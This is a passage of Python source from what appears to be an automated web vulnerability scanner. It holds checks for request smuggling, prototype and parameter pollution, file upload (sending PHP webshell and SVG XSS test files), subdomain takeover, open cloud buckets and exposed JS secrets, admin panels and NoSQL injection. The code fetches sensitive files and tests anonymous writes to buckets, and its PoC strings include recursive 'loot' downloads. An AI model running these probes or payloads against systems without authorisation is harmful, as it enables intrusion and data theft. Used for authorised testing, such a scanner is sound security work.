                        sock = ctx.wrap_socket(sock, server_hostname=host)
                    start = time.time()
                    sock.sendall(raw_req.encode())
                    resp = b""
                    try:
                        sock.settimeout(8)
                        while len(resp) < 8192:
                            chunk = sock.recv(4096)
                            if not chunk: break
                            resp += chunk
                    except socket.timeout:
                        elapsed = time.time() - start
                        if elapsed >= 4.5:
                            findings.append(F("smuggling","critical",url,
                                f"HTTP Request Smuggling ({label}) -- timing confirms desync",
                                variant=label,
                                timing=f"{elapsed:.1f}s delay",
                                poc=f"python3 smuggler.py -u '{url}' --no-color",
                                impact="Bypass WAF/auth, poison caches, steal requests from other users",
                                remediation="Normalize HTTP at front-end proxy. Reject ambiguous CL+TE requests."))
                    except: pass
                    finally:
                        try: sock.close()
                        except: pass
                except: pass

            # Fast header-based fingerprint (less accurate but instant)
            r = _get(url, headers={"Transfer-Encoding": "chunked, x-ignore"}, timeout=5)
            if r and r[0] == 400:
                findings.append(F("smuggling","medium",url,
                    "TE.TE desync candidate -- server rejects obfuscated Transfer-Encoding",
                    poc=f"curl -v -H 'Transfer-Encoding: chunked, x-ignore' '{url}'",
                    impact="Possible request desync between proxy layers",
                    remediation="Ensure consistent Transfer-Encoding handling across all proxy layers."))
        except: pass
    return findings


# ── 19. PROTOTYPE POLLUTION ───────────────────────────────────────────────────
def check_prototype(endpoints:List[str]) -> List[dict]:
    findings=[]
    payloads=[
        "__proto__[polluted]=bugscan",
        "__proto__.polluted=bugscan",
        "constructor[prototype][polluted]=bugscan",
        "constructor.prototype.polluted=bugscan",
    ]
    for ep in endpoints[:100]:
        if "=" not in ep: continue
        try:
            parsed=urllib.parse.urlparse(ep)
            qs=urllib.parse.parse_qs(parsed.query)
        except: continue
        for payload in payloads:
            test=f"{ep}&{payload}" if "?" in ep else f"{ep}?{payload}"
            r=_get(test,timeout=8)
            if r and r[0]==200 and "bugscan" in r[2]:
                findings.append(F("prototype","high",ep,
                    "Prototype pollution reflected in response",
                    payload=payload,poc=f"curl '{test}'",
                    impact="Client/server-side prototype pollution enables RCE, auth bypass",
                    remediation="Use Object.create(null) for maps, validate input keys."))
                break
    return findings


# ── HTTP Parameter Pollution ───────────────────────────────────────────────────
def check_hpp(endpoints: List[str]) -> List[dict]:
    """
    HTTP Parameter Pollution -- duplicate params with different values.
    Some servers use first value (WAF bypass), some use last (logic bypass),
    some concatenate (injection).
    """
    findings = []
    tested   = set()

    for ep in endpoints[:200]:
        if "=" not in ep: continue
        try:
            parsed = urllib.parse.urlparse(ep)
            qs     = urllib.parse.parse_qs(parsed.query)
        except: continue

        for param in list(qs.keys())[:4]:
            key = (ep.split("?")[0], param)
            if key in tested: continue
            tested.add(key)

            orig_val = qs[param][0] if qs[param] else "1"
            # Inject duplicate param with different values
            poison_val = "hpp-bugscan-test"
            # First: param=original&param=poison
            test1 = ep + f"&{param}={poison_val}"
            # Second: param=poison&param=original (reversed)
            base_qs = {k:v[0] for k,v in qs.items() if k != param}
            base_qs[f"__hpp_{param}"] = orig_val
            test2 = urllib.parse.urlunparse(parsed._replace(
                query=f"{param}={poison_val}&" + urllib.parse.urlencode(base_qs).replace(f"__hpp_{param}",param)
            ))

            r1 = _get(ep, timeout=6)
            r2 = _get(test1, timeout=6)

            if not r1 or not r2: continue

            # If poisoned value appears in response = HPP confirmed
            if poison_val in r2[2] and poison_val not in r1[2]:
                # Check which value server used
                if orig_val in r2[2]:
                    server_uses = "last"
                else:
                    server_uses = "first (WAF bypass risk)"

                findings.append(F("prototype", "medium", ep,
                    f"HTTP Parameter Pollution in '{param}' -- server uses {server_uses} value",
                    param=param, orig=orig_val, injected=poison_val,
                    server_behavior=server_uses,
                    poc=(f"# HPP: duplicate param with different values\n"
                         f"curl '{test1}'\n"
                         f"# Compare with: curl '{ep}'"),
                    impact="WAF bypass, business logic manipulation, auth bypass",
                    remediation="Reject or normalize duplicate parameters server-side."))
                break

    return findings

# ── 20. FILE UPLOAD ───────────────────────────────────────────────────────────
def check_fileupload(targets:List[str], endpoints:List[str]) -> List[dict]:
    findings=[]
    upload_paths=["/upload","/file/upload","/api/upload","/files/upload",
                  "/media/upload","/documents/upload","/image/upload",
                  "/api/files","/v1/upload","/upload.php","/fileupload"]
    for url in targets[:30]:
        base=url.rstrip("/")
        for path in upload_paths:
            r=_get(base+path,timeout=6)
            if not r: continue
            if r[0] in (200,405,415,422):
                # Try uploading a webshell with different content types
                for filename,ct,content in [
                    ("test.php","application/x-php",b"<?php echo 'BugScanPRO'; ?>"),
                    ("test.php.jpg","image/jpeg",b"<?php echo 'BugScanPRO'; ?>"),
                    ("test.phtml","text/html",b"<?php echo 'BugScanPRO'; ?>"),
                    ("test.svg","image/svg+xml",b"<svg><script>alert(1)</script></svg>"),
                ]:
                    boundary="BugScanBoundary"
                    body=(f"--{boundary}\r\n"
                          f"Content-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\n"
                          f"Content-Type: {ct}\r\n\r\n").encode()+content+f"\r\n--{boundary}--\r\n".encode()
                    r2=_req(base+path,"POST",
                            headers={"Content-Type":f"multipart/form-data; boundary={boundary}"},
                            data=body,timeout=10)
                    if r2 and r2[0] in (200,201):
                        # Check if file was stored
                        file_url=""
                        try:
                            d=json.loads(r2[2])
                            file_url=d.get("url",d.get("path",d.get("file","")))
                        except: pass
                        if "BugScanPRO" in r2[2] or file_url:
                            findings.append(F("fileupload","critical",base+path,
                                f"Unrestricted file upload -- {filename} accepted",
                                filename=filename,content_type=ct,
                                file_url=file_url,response_preview=r2[2][:200],
                                impact="Webshell upload → RCE, stored XSS",
                                remediation="Validate file type by magic bytes, store outside webroot, rename files."))
    return findings

# ── 21. SUBDOMAIN TAKEOVER ────────────────────────────────────────────────────
TAKEOVER_SIGS={
    "amazonaws.com":     ["NoSuchBucket","The specified bucket does not exist","NoSuchKey"],
    "github.io":         ["There isn't a GitHub Pages site here","404"],
    "herokuapp.com":     ["No such app","there is no app","Application Error"],
    "azurewebsites.net": ["404 Web Site not found","The web site you are looking for"],
    "shopify.com":       ["Sorry, this shop is currently unavailable"],
    "fastly.net":        ["Fastly error: unknown domain","Please check that this domain"],
    "surge.sh":          ["project not found","404"],
    "readme.io":         ["Project doesnt exist","project not found"],
    "ghost.io":          ["The thing you were looking for is no longer here"],
    "zendesk.com":       ["Help Center Closed","Oops, this help center"],
    "tumblr.com":        ["Whatever you were looking for doesn't currently exist"],
    "gitbook.io":        ["Sign in to GitBook"],
    "fly.io":            ["404 Not Found","no app"],
    "netlify.app":       ["Not Found","404"],
    "vercel.app":        ["404: NOT_FOUND","The deployment could not be found"],
    "pages.dev":         ["404 Not Found"],
    "azurefd.net":       ["The resource you are looking for has been removed"],
    "trafficmanager.net":["404 Not Found"],
    "cloudapp.net":      ["404 Not Found"],
    "s3.amazonaws.com":  ["NoSuchBucket","NoSuchKey"],
    "wpengine.com":      ["The site you were looking for couldn't be found"],
    "helpscout.net":     ["No settings were found"],
    "uservoice.com":     ["This UserVoice subdomain is currently available"],
    "intercom.io":       ["This page doesn't exist"],
    "pingdom.com":       ["Sorry, this status page doesn't exist"],
    "statuspage.io":     ["You are being redirected"],
    # Modern hosting platforms
    "render.com":           ["No Such App","This site is hosted on Render"],
    "up.railway.app":       ["Application not found","GKE Ingress"],
    "pages.cloudflare.com": ["404 Not Found","cloudflare pages"],
    "gitlab.io":            ["404","The page you're looking for could not be found"],
    "bitbucket.io":         ["Repository not found","The page you're looking for"],
    "webflow.io":           ["The page you are looking for doesn't exist","webflow"],
    "squarespace.com":      ["No Such Account","page not found"],
    "freshdesk.com":        ["There is no helpdesk here","We couldn't find"],
    "hubspot.com":          ["There is no HubSpot","Domain not found"],
    "strikingly.com":       ["page not found","no longer available"],
    "pantheon.io":          ["404 error unknown site","The gods are wise"],
    "cargo.site":           ["404 Not Found","cargo"],
    # AWS variants
    "s3-website":           ["NoSuchBucket","The specified bucket does not exist"],
    "elasticbeanstalk.com": ["404 Not Found","No Application","application not found"],
    "execute-api.amazonaws.com": ["Missing Authentication Token","Forbidden"],
}

def check_takeover(subs:List[str]) -> List[dict]:
    findings=[]
    for sub in subs[:500]:
        for provider,sigs in TAKEOVER_SIGS.items():
            if provider not in sub: continue
            for scheme in ["https","http"]:
                r=_get(f"{scheme}://{sub}",timeout=8)
                if not r: continue
                status,hdrs,body=r
                for sig in sigs:
                    if sig.lower() in body.lower() or (sig=="404" and status==404):
                        findings.append(F("takeover","critical",f"{scheme}://{sub}",
                            f"Subdomain takeover via {provider}",
                            provider=provider,signature=sig,
                            poc=f"Register {provider} service pointing to {sub}",
                            impact="Full control over subdomain -- phishing, cookie theft, XSS",
                            remediation="Remove DNS record or register the external service."))
                        break

    return findings

def check_buckets(domain:str, subs:List[str]) -> List[dict]:
    findings=[]
    org=domain.split(".")[0]

    # Generate comprehensive bucket name candidates
    candidates=set()
    words = [org] + domain.replace(".","-").split("-") + domain.split(".")
    for w in words:
        if len(w) < 2: continue
        candidates.add(w)
        for suffix in ["dev","prod","staging","stage","backup","backups","assets",
                       "media","static","files","data","uploads","images","logs",
                       "archive","dump","db","database","config","configs","secrets",
                       "public","private","internal","test","uat","qa","beta","admin",
                       "storage","cdn","content","web","app","api","mobile","ios",
                       "android","release","build","deploy","infra","k8s","helm"]:
            candidates.add(f"{w}-{suffix}")
            candidates.add(f"{w}.{suffix}")
            candidates.add(f"{suffix}-{w}")
            candidates.add(f"{w}{suffix}")

    # Add sub-based candidates
    for sub in subs[:80]:
        part = sub.split(".")[0]
        if len(part) > 2:
            candidates.add(part)
            candidates.add(f"{part}-backup")
            candidates.add(f"{part}-assets")

    # Remove invalid bucket names
    candidates = {c for c in candidates
                  if 3 <= len(c) <= 63
                  and re.match(r'^[a-z0-9][a-z0-9\-\.]+[a-z0-9]$', c.lower())}

    log.info(f"[buckets] testing {len(candidates)} candidates")

    def _test_bucket(name):
        results = []
        name_lower = name.lower()

        bucket_urls = [
            # AWS S3
            (f"https://{name_lower}.s3.amazonaws.com", "aws", "s3"),
            (f"https://s3.amazonaws.com/{name_lower}", "aws", "s3"),
            (f"https://{name_lower}.s3.us-east-1.amazonaws.com", "aws", "s3"),
            (f"https://{name_lower}.s3.eu-west-1.amazonaws.com", "aws", "s3"),
            # GCS
            (f"https://storage.googleapis.com/{name_lower}", "gcp", "gcs"),
            (f"https://{name_lower}.storage.googleapis.com", "gcp", "gcs"),
            # Azure Blob
            (f"https://{name_lower}.blob.core.windows.net", "azure", "blob"),
            (f"https://{name_lower}.blob.core.windows.net/{name_lower}", "azure", "blob"),
            # DigitalOcean Spaces
            (f"https://{name_lower}.nyc3.digitaloceanspaces.com", "do", "spaces"),
            (f"https://{name_lower}.sfo2.digitaloceanspaces.com", "do", "spaces"),
            # Backblaze B2
            (f"https://f001.backblazeb2.com/file/{name_lower}/", "backblaze", "b2"),
            # Alibaba OSS
            (f"https://{name_lower}.oss-cn-hangzhou.aliyuncs.com", "alibaba", "oss"),
        ]

        for url, provider, service in bucket_urls:
            try:
                r = _get(url, timeout=6)
                if not r: continue
                status, hdrs, body = r

                # Public read -- full listing
                if status == 200 and any(s in body for s in
                    ["ListBucketResult","Contents","Key>","Blob","EnumerationResults",
                     "<?xml","<keys>","\"objects\""]):
                    # Try to extract file list
                    files = re.findall(r'<Key>([^<]+)</Key>', body)[:5]
                    files += re.findall(r'"name"\s*:\s*"([^"]+)"', body)[:5]

                    # Enumerate files inside the bucket
                    file_list = (re.findall(r'<Key>([^<]+)</Key>', body)[:10] +
                                 re.findall(r'"name"\s*:\s*"([^"]+)"', body)[:10] +
                                 re.findall(r'<Blob><Name>([^<]+)</Name>', body)[:10])

                    # Check for sensitive files
                    sensitive_patterns = [
                        r'\b(backup|dump|\.sql|\.tar|\.zip|\.gz|\.env|credentials?|secret|password|config)\b',
                        r'\b(database|private|internal|confidential|\.pem|\.key|\.cert)\b'
                    ]
                    sensitive_files = [f for f in file_list
                                       if any(re.search(p, f, re.I) for p in sensitive_patterns)]

                    # Try to download a sensitive file if found
                    if sensitive_files:
                        sample_url = url.rstrip("/") + "/" + sensitive_files[0]
                        r_dl = _get(sample_url, timeout=6)
                        if r_dl and r_dl[0] == 200 and len(r_dl[2]) > 0:
                            results.append(F("buckets","critical",url,
                                f"Open bucket with sensitive file accessible: {sensitive_files[0]}",
                                bucket_name=name,provider=provider,service=service,
                                sensitive_file=sensitive_files[0],
                                file_preview=r_dl[2][:200],
                                poc=f"curl -s '{sample_url}' | head -20",
                                impact=f"Sensitive file '{sensitive_files[0]}' publicly readable -- credential exposure",
                                remediation="Make bucket private immediately. Rotate any exposed credentials."))

                    # Try anonymous upload (write access)
                    try:
                        test_key = f"bugscan-test-{int(__import__('time').time())}.txt"
                        test_url_up = url.rstrip("/") + "/" + test_key
                        req_up = __import__('urllib.request').request.Request(
                            test_url_up,
                            data=b"BugScan ELITE write-access test",
                            headers={"Content-Type":"text/plain"},
                            method="PUT")
                        import ssl as _ssl2
                        ctx2 = _ssl2.create_default_context()
                        ctx2.check_hostname=False; ctx2.verify_mode=_ssl2.CERT_NONE
                        with __import__('urllib.request').request.urlopen(req_up, timeout=8, context=ctx2) as r_up:
                            if r_up.status in (200,201,204):
                                results.append(F("buckets","critical",url,
                                    f"BUCKET WRITE ACCESS -- anonymous upload confirmed",
                                    bucket_name=name,provider=provider,service=service,
                                    upload_url=test_url_up,
                                    poc=f"curl -X PUT '{test_url_up}' -d 'test' -H 'Content-Type: text/plain'",
                                    impact="Anyone can upload files -- malware distribution, content injection, data tampering",
                                    remediation="Set bucket ACL to private. Enable server-side encryption. Add bucket policy."))
                    except: pass
                    has_sensitive = any(re.search(p, body, re.I) for p in sensitive_patterns)
                    _cdn = any(w in name_lower for w in ["images","img","static","assets","media","cdn","icons","thumbnails","avatar","photo"])
                    sev = "critical" if has_sensitive else ("medium" if _cdn else "high")

                    # Auto-peek at interesting files (download first 2KB preview)
                    previewed = {}
                    interesting = [f for f in files if re.search(
                        r'\.(env|sql|bak|key|pem|json|conf|config|xml|yml|yaml|txt|log|csv|dump|tar|zip|gz)$',
                        f, re.I
                    )][:3]
                    for fname in interesting:
                        try:
                            furl = f"{url}/{fname}"
                            fr = _get(furl, timeout=5)
                            if fr and fr[0] == 200:
                                previewed[fname] = fr[2][:512]
                        except: pass

                    results.append(F("buckets", sev, url,
                        f"Public {provider.upper()} {service.upper()} bucket: {name_lower}",
                        bucket_name=name_lower, provider=provider, service=service,
                        public_read=True,
                        sample_files=files[:10],
                        sensitive_content=has_sensitive,
                        file_previews=previewed,
                        preview=body[:400],
                        poc=(f"# List bucket contents:\n"
                             f"aws s3 ls s3://{name_lower}/ --no-sign-request\n\n"
                             f"# Download all:\n"
                             f"aws s3 cp s3://{name_lower}/ ./loot/ --recursive --no-sign-request"),
                        impact=f"Public {service.upper()} bucket exposes ALL stored data to anyone on internet{'. SENSITIVE FILES FOUND!' if has_sensitive else ''}",
                        remediation=f"Set bucket ACL to private immediately. Enable server-side encryption. Audit access logs."))

                # Bucket exists but access denied -- still valuable
                elif status == 403:
                    sig = hdrs.get("x-amz-request-id","") or hdrs.get("x-ms-request-id","")
                    if sig or "AccessDenied" in body or "AuthorizationRequired" in body:
                        # 403 = bucket EXISTS but private — LOW not MEDIUM
                        # Medium reserved for misconfigured buckets with some public access
                        results.append(F("buckets", "low", url,
                            f"{provider.upper()} bucket exists (access denied): {name_lower}",
                            bucket_name=name_lower, provider=provider, service=service,
                            public_read=False,
                            note="Bucket confirmed to exist -- check for write access, takeover",
                            poc=f"aws s3 ls s3://{name_lower}/ --no-sign-request",
                            remediation="Verify bucket policy. Test for write access and bucket takeover."))

                # Test write access on public buckets
                if status == 200 and provider == "aws":
                    test_key = f"bugscan-writetest-{int(time.time())}.txt"
                    write_url = f"{url}/{test_key}"
                    try:
                        wr = _req(write_url, "PUT",
                                  headers={"Content-Type":"text/plain"},
                                  data=b"bugscan-elite-writetest",
                                  timeout=5)
                        if wr and wr[0] in (200, 204):
                            results.append(F("buckets", "critical", url,
                                f"WRITE ACCESS to public S3 bucket: {name_lower}",
                                bucket_name=name_lower, provider=provider,
                                write_access=True,
                                test_key=test_key,
                                poc=(f"# Write to bucket (CONFIRMED):\n"
                                     f"aws s3 cp file.txt s3://{name_lower}/file.txt --no-sign-request\n\n"
                                     f"# List bucket:\n"
                                     f"aws s3 ls s3://{name_lower}/ --no-sign-request"),
                                impact="Attacker can write/delete files, host malware, modify website content",
                                remediation="Remove public write ACL immediately. Apply deny-all bucket policy."))
                            try: _req(write_url, "DELETE", timeout=3)
                            except: pass
                    except: pass

            except Exception as e:
                log.debug(f"bucket {url}: {e}")

        return results

    # Run in parallel
    from concurrent.futures import ThreadPoolExecutor as _TPE, as_completed as _ac
    lock = threading.Lock()
    cands = list(candidates)[:80]

    with _TPE(max_workers=20) as exe:
        futs = {exe.submit(_test_bucket, n): n for n in cands}
        for fut in _ac(futs, timeout=120):
            try:
                results = fut.result(timeout=10)
                if results:
                    with lock: findings.extend(results)
            except: pass

    log.info(f"[buckets] {len(findings)} findings from {len(cands)} candidates")
    return findings

# ── 23. JS SECRETS ────────────────────────────────────────────────────────────
JS_SECRET_PATTERNS={
    "AWS Access Key":      r'AKIA[0-9A-Z]{16}',
    "AWS Secret Key":      r'(?i)aws[_\-\s]{0,5}secret[_\-\s]{0,5}(access[_\-\s]{0,5})?key[\s\S]{0,20}["\']([0-9a-zA-Z/+=]{40})',
    "GitHub Token":        r'ghp_[0-9a-zA-Z]{36}',
    "GitHub OAuth":        r'gho_[0-9a-zA-Z]{36}',
    "GitHub App":          r'(ghu|ghs)_[0-9a-zA-Z]{36}',
    "Google API Key":      r'AIza[0-9A-Za-z\-_]{35}',
    "Google OAuth":        r'[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com',
    "Slack Token":         r'xox[baprs]-[0-9a-zA-Z\-]{10,100}',
    "Slack Webhook":       r'https://hooks\.slack\.com/services/T[0-9A-Z]{8}/B[0-9A-Z]{8}/[0-9a-zA-Z]{24}',
    "Stripe Secret":       r'sk_live_[0-9a-zA-Z]{24}',
    "Stripe Publishable":  r'pk_live_[0-9a-zA-Z]{24}',
    "Twilio SID":          r'AC[a-z0-9]{32}',
    "Twilio Token":        r'SK[0-9a-fA-F]{32}',
    "SendGrid Key":        r'SG\.[a-zA-Z0-9]{22}\.[a-zA-Z0-9]{43}',
    "Firebase":            r'AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}',
    "JWT Token":           r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}',
    "Private Key":         r'-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----',
    "Basic Auth":          r'(?i)authorization:\s*basic\s+[a-zA-Z0-9+/=]{8,}',
    "Generic API Key":     r'(?i)(api_key|apikey|api-key)\s*[=:]\s*["\'][a-zA-Z0-9_\-]{16,64}["\']',
    "Mailgun Key":         r'key-[0-9a-zA-Z]{32}',
    "Mailchimp Key":       r'[0-9a-f]{32}-us[0-9]{1,2}',
    "Heroku API Key":      r'[hH]eroku[a-zA-Z0-9_\-]{0,20}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}',
    "Shopify Secret":      r'shpss_[a-fA-F0-9]{32}',
    "Square OAuth":        r'sq0atp-[0-9A-Za-z\-_]{22}',
    "PayPal BrainTree":    r'access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}',
    "Alibaba AccessKey":   r'LTAI[a-zA-Z0-9]{20}',
    "Discord Token":       r'[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}',
    "Telegram Bot":        r'[0-9]{8,10}:[a-zA-Z0-9_-]{35}',
    "NPM Token":           r'npm_[a-zA-Z0-9]{36}',
    "DockerHub Token":     r'dckr_pat_[a-zA-Z0-9_-]{27}',
    # AI / ML services
    "Anthropic API Key":   r'sk-ant-[a-zA-Z0-9_-]{80,}',
    "OpenAI API Key":      r'sk-[a-zA-Z0-9]{48}',
    "HuggingFace Token":   r'hf_[a-zA-Z0-9]{34,}',
    "Replicate Token":     r'r8_[a-zA-Z0-9]{37}',
    "Cohere Key":          r'[a-zA-Z0-9]{40}(?=.*cohere)',
    # Cloud providers
    "Cloudflare API Token":r'[a-zA-Z0-9_-]{40}(?=.*cloudflare|cf[-_]token)',
    "Azure Storage Key":   r'(?:DefaultEndpointsProtocol|AccountKey)[^\s\'"]{20,}',
    "GCP Service Account": r'"private_key":\s*"-----BEGIN RSA PRIVATE',
    "Vercel Token":        r'[a-zA-Z0-9]{24}(?=.*vercel)',
    "Netlify Token":       r'[a-zA-Z0-9]{40}(?=.*netlify)',
    # Databases / backends
    "Supabase Key":        r'eyJ[a-zA-Z0-9_-]{50,}\.[a-zA-Z0-9_-]{50,}',
    "PlanetScale Token":   r'pscale_tkn_[a-zA-Z0-9_]{43}',
    "Neon DB URL":         r'postgresql://[^\s]+@[^\s]+\.neon\.tech',
    "MongoDB Atlas":       r'mongodb\+srv://[^\s]+:[^\s]+@[^\s]+\.mongodb\.net',
    # Observability
    "Datadog API Key":     r'(?:DD_API_KEY|datadog)[^=]*=\s*[a-f0-9]{32}',
    "Sentry DSN":          r'https://[a-f0-9]{32}@[a-z0-9]+\.ingest\.sentry\.io',
    "New Relic Key":       r'NRAK-[A-Z0-9]{27}',
    "LogRocket App ID":    r'[a-z0-9]{6}/[a-z0-9-]+(?=.*logrocket)',
    # Maps / search
    "Mapbox Token":        r'pk\.[a-zA-Z0-9_-]{60,}',
    "Algolia Admin Key":   r'[a-f0-9]{32}(?=.*algolia|X-Algolia-API-Key)',
    "Google Maps Key":     r'AIza[0-9A-Za-z_-]{35}',
    # Infra
    "Terraform Cloud":     r'[a-zA-Z0-9\-\.]{14}\.atlasv1\.[a-zA-Z0-9_-]{67}',
    "Vault Token":         r'hvs\.[a-zA-Z0-9_-]{24,}',
    "Consul Token":        r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}(?=.*consul)',
    # Dev tools
    "Linear API Key":      r'lin_api_[a-zA-Z0-9]{40}',
    "Notion Token":        r'secret_[a-zA-Z0-9]{43}',
    "Airtable API Key":    r'key[a-zA-Z0-9]{14}',
    "Pusher App Secret":   r'[a-f0-9]{10}(?=.*pusher)',
    "PyPI Token":          r'pypi-[a-zA-Z0-9_-]{80,}',
    "RubyGems Key":        r'rubygems_[a-f0-9]{48}',
}


# Values that match patterns but are clearly placeholders — skip these
_SECRET_PLACEHOLDERS = {
    "your_api_key", "your_key_here", "xxxxx", "yyyyy", "00000",
    "example", "placeholder", "insert_here", "changeme", "replace_me",
    "your_token", "your_secret", "api_key_here", "sk_test_", "pk_test_",
    "test_key", "dev_key", "demo_key", "sample_key", "fake_key",
    "null", "undefined", "none", "empty", "xxxxxxxx",
}

def _is_placeholder(value: str) -> bool:
    """Return True if the matched secret value looks like a placeholder."""
    if not value or len(value) < 8: return True
    v = value.lower().strip('"\' ').replace('-','').replace('_','')
    # All same char
    if len(set(v)) <= 2: return True
    # Known placeholder words
    if any(p in v for p in _SECRET_PLACEHOLDERS): return True
    # Too many repeated chars (xxxx, 1234, aaaa)
    if max(v.count(c) for c in set(v)) > len(v) * 0.6: return True
    return False

def check_jsleak(endpoints:List[str]) -> List[dict]:
    findings=[]
    js_eps=[e for e in endpoints if re.search(r'\.js(\?|#|$)',e,re.I)][:150]
    seen_vals = set()  # dedup by secret value

    for url in js_eps:
        r=_get(url,timeout=10)
        if not r or r[0]!=200: continue
        body=r[2]
        # Layer 1: Our regex patterns
        for name,pattern in JS_SECRET_PATTERNS.items():
            m=re.search(pattern,body)
            if m:
                match_str=m.group(0)[:120]
                # Extract just the value portion for placeholder check
                val_only = re.sub(r'(?i)(api_key|password|secret|token|key)[\s=:"\'+]*', '', match_str).strip('" \t')
                if _is_placeholder(val_only): continue  # skip placeholders
                val_key  = match_str[:40].lower().strip()
                if val_key in seen_vals: continue
                seen_vals.add(val_key)
                sev="critical" if any(k in name for k in ["AWS","Private Key","JWT","Stripe Secret",
                                                            "GitHub Token","SendGrid","OpenAI",
                                                            "Anthropic","Firebase","GCP"]) else "high"
                findings.append(F("jsleak",sev,url,
                    f"Secret in JS: {name}",
                    secret_type=name,
                    preview=match_str,
                    confidence=85,
                    impact=f"Exposed {name} enables unauthorized API/service access",
                    remediation="Remove secrets from client-side code, use environment variables.",
                    poc=f"curl -s {url} | grep -oP '{'${match_str[:20].replace(chr(39),chr(34))}...'}' "))

    # Layer 2: UnifiedSecretHunter (no license key required)
    try:
        if js_eps:
            from engine.jxscout import run_secret_hunter, is_installed
            if is_installed():
                _domain = urllib.parse.urlparse(js_eps[0]).netloc if js_eps else ""
                sh_results = run_secret_hunter(js_eps[:50], _domain)
            for sh in sh_results:
                val_key = (sh.get("value","")[:40]).lower().strip()
                if val_key in seen_vals or not val_key: continue
                seen_vals.add(val_key)
                findings.append(F("jsleak", sh.get("severity","high"), sh.get("url",""),
                    f"Secret in JS: {sh.get('type','Unknown')} [SecretHunter]",
                    secret_type=sh.get("type",""),
                    preview=sh.get("value","")[:120],
                    confidence=90,
                    impact=f"Exposed {sh.get('type','')} credential",
                    remediation="Remove secrets from client-side code, use secret managers.",
                    tool="UnifiedSecretHunter"))
    except Exception as _she:
        log.debug(f"[jsleak] secret_hunter: {_she}")

    return findings

# ── 24. ADMIN PANELS ─────────────────────────────────────────────────────────
PANEL_PATHS=[
    ("/admin","Admin panel"),("/admin/","Admin panel"),
    ("/administrator","Administrator panel"),("/admin/login","Admin login"),
    ("/admin/dashboard","Admin dashboard"),("/admin/index.php","Admin PHP"),
    ("/wp-admin/","WordPress admin"),("/wp-login.php","WordPress login"),
    ("/login","Login page"),("/signin","Sign in page"),
    ("/user/login","User login"),("/auth/login","Auth login"),
    ("/dashboard","Dashboard"),("/console","Console"),
    ("/panel","Panel"),("/manage","Manage"),
    ("/management","Management"),("/backend","Backend"),
    ("/controlpanel","Control Panel"),("/cp","CP"),
    ("/cms","CMS"),("/cms/admin","CMS Admin"),
    ("/phpmyadmin/","phpMyAdmin"),("/pma/","PMA"),
    ("/adminer/","Adminer"),("/adminer.php","Adminer PHP"),
    ("/webadmin/","Web Admin"),("/sysadmin/","Sys Admin"),
    ("/manager/","Manager"),("/manager/html","Tomcat Manager"),
    ("/host-manager/html","Tomcat Host Manager"),
    ("/jenkins/","Jenkins CI"),("/jenkins","Jenkins CI"),
    ("/sonar/","SonarQube"),("/sonarqube/","SonarQube"),
    ("/kibana/","Kibana"),("/app/kibana","Kibana App"),
    ("/grafana/","Grafana"),("/grafana","Grafana"),
    ("/portainer/","Portainer"),
    ("/gitlab/","GitLab"),("/github/","GitHub Enterprise"),
    ("/jira/","Jira"),("/confluence/","Confluence"),
    ("/airflow/","Apache Airflow"),
    ("/flower/","Celery Flower"),
    ("/rabbitmq/","RabbitMQ"),
    ("/redis/","Redis"),
    ("/mongo-express/","Mongo Express"),
    ("/pgadmin/","pgAdmin"),
    ("/roundcube/","Roundcube"),
    ("/webmail/","Webmail"),
    ("/owa/","Outlook Web Access"),
    ("/exchange/","Exchange"),
    ("/remote/","Remote Access"),
    ("/vpn/","VPN Portal"),
    ("/zabbix/","Zabbix"),
    ("/nagios/","Nagios"),
    ("/cacti/","Cacti"),
    ("/staff/","Staff Portal"),
    ("/internal/","Internal"),
    ("/private/","Private"),
    ("/secret/","Secret"),
    ("/api/admin","Admin API"),
    ("/api/internal","Internal API"),
]

_panels_seen: set = set()   # global dedup across all hosts

def check_panels(url:str) -> List[dict]:
    if not url or not isinstance(url, str) or not url.startswith("http"): return []
    global _panels_seen
    findings=[]
    base=url.rstrip("/")
    lock=threading.Lock()

    def _chk(entry):
        path,name=entry
        full_url = base+path
        if full_url in _panels_seen: return None
        try:
            r=_get(full_url,timeout=4)
            if not r: return None
            status,hdrs,body=r
            if status not in (200,401,403): return None
            # Skip proxy/gateway error responses (not real findings)
            proxy_noise = ["host not allowed","access denied","forbidden by policy",
                          "blocked by","not permitted","gateway","proxy error"]
            body_low = body.lower()[:200]
            if len(body) < 50 or any(p in body_low for p in proxy_noise):
                return None
            _panels_seen.add(full_url)
            sev="high" if status==200 else "medium"
            default_creds=any(k in body.lower() for k in
                ["default","admin/admin","admin/password","test/test","admin123","password123"])
            if default_creds: sev="critical"
            desc=f"{name} found (HTTP {status})"
            if default_creds: desc += " [DEFAULT CREDS HINT]"
            return F("panels",sev,full_url, desc,
                path=path, panel_name=name, status=str(status),
                default_creds_hint=default_creds,
                poc=f"curl -sv '{full_url}'",
                impact="Admin panel access enables full application control",
                remediation="Restrict admin paths to internal IPs. Implement MFA.")
        except: return None

    from concurrent.futures import ThreadPoolExecutor as _TPE, as_completed as _ac
    with _TPE(max_workers=15) as exe:
        futs={exe.submit(_chk,e):e for e in PANEL_PATHS}
        for fut in _ac(futs):
            r=fut.result()
            if r:
                with lock: findings.append(r)
    return findings

# ── 25. NOSQL INJECTION ───────────────────────────────────────────────────────
NOSQL_PAYLOADS=[
    # MongoDB operator injection
    ({"$gt":""},          ["_id","username","email","password","user","token"]),
    ({"$ne":None},        ["_id","username","email","data"]),
    ({"$regex":".*"},     ["_id","username","email"]),
    ({"$where":"1==1"},   ["_id","username"]),
    ({"$exists":True},    ["_id","username","email"]),
    ({"$nin":[]},         ["_id","username","email"]),
    # Auth bypass payloads
    ({"$gt":"0"},         ["token","session","user","admin","success"]),
    ({"$gte":""},         ["token","user","success","true"]),
    # Injection via array
    (["admin","user"],    ["admin","user","token","success"]),
    # NoSQL string patterns (URL param injection)
    ("[$ne]",             ["error","null","0","false"]),   # for GET params
